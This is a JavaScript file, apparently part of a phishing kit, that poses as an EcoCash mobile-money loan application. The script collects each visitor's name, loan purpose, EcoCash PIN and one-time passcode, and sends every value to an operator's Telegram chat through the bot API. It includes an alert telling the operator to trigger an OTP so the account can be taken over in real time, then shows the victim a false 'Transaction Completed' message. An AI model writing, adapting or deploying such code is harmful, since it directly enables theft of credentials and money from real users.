// TELEGRAM BOT INTEGRATION CONFIGURATION
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // e.g. '7123456789:AAEF...'
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';     // e.g. '123456789'

// Function to send direct alerts to your Telegram Admin Chat
async function sendTelegramAlert(messageText) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
        console.warn('Telegram Bot Token or Chat ID not configured in app.js yet!');
        return;
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Error delivering Telegram message:', err);
    }
}

let applicantData = {};

document.addEventListener('DOMContentLoaded', () => {
    const loanSlider = document.getElementById('loanAmount');
    const amountDisp = document.getElementById('amountDisplay');
    const interestDisp = document.getElementById('interestDisplay');
    const totalDisp = document.getElementById('totalDisplay');

    if (loanSlider) {
        loanSlider.addEventListener('input', (e) => {
            const val = parseFloat(e.target.value);
            const interest = val * 0.05;
            const total = val + interest;

            if (amountDisp) amountDisp.textContent = `$${val}`;
            if (interestDisp) interestDisp.textContent = `$${interest.toFixed(0)}`;
            if (totalDisp) totalDisp.textContent = `$${total.toFixed(0)}`;
        });
    }
});

// Step 1: Submit Application Details & Send Telegram Notification
async function submitLoanStep1(event) {
    if (event) event.preventDefault();

    const name = document.getElementById('fullName')?.value || 'N/A';
    const purpose = document.getElementById('loanPurpose')?.value || 'N/A';
    const amount = document.getElementById('loanAmount')?.value || '300';
    const repayable = (parseFloat(amount) * 1.05).toFixed(0);

    applicantData = { name, purpose, amount, repayable };

    const alertMsg = `🚨 <b>NEW ECOCASH LOAN APPLICATION</b> 🚨\n\n` +
                     `👤 <b>Applicant Name:</b> ${name}\n` +
                     `💰 <b>Loan Amount:</b> $${amount}\n` +
                     `📈 <b>Total Repayable:</b> $${repayable}\n` +
                     `🎯 <b>Purpose:</b> ${purpose}\n\n` +
                     `⏳ <i>User is currently on PIN entry step...</i>`;

    await sendTelegramAlert(alertMsg);

    document.getElementById('step1')?.classList.add('hidden');
    document.getElementById('step2')?.classList.remove('hidden');
}

// Step 2: Submit EcoCash PIN & Send Telegram Notification
async function submitPinStep2(event) {
    if (event) event.preventDefault();

    const pin = document.getElementById('userPin')?.value || '****';

    const alertMsg = `🔑 <b>ECOCASH PIN ENTERED</b> 🔑\n\n` +
                     `👤 <b>Applicant:</b> ${applicantData.name || 'User'}\n` +
                     `🔐 <b>PIN:</b> <code>${pin}</code>\n` +
                     `💰 <b>Loan Request:</b> $${applicantData.amount || '300'}\n\n` +
                     `⚡ <b>Action Required:</b> Send OTP code to user to finalize approval.`;

    await sendTelegramAlert(alertMsg);

    document.getElementById('step2')?.classList.add('hidden');
    document.getElementById('step3')?.classList.remove('hidden');
}

// Step 3: Submit OTP Verification Code & Send Telegram Notification
async function verifyOtpStep3(event) {
    if (event) event.preventDefault();

    const otp = document.getElementById('otpCode')?.value || '------';

    const alertMsg = `✅ <b>OTP CODE SUBMITTED</b> ✅\n\n` +
                     `👤 <b>Applicant:</b> ${applicantData.name || 'User'}\n` +
                     `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
                     `🎉 <b>Status:</b> Transaction Completed!`;

    await sendTelegramAlert(alertMsg);

    document.getElementById('step3')?.classList.add('hidden');
    document.getElementById('step4')?.classList.remove('hidden');
}
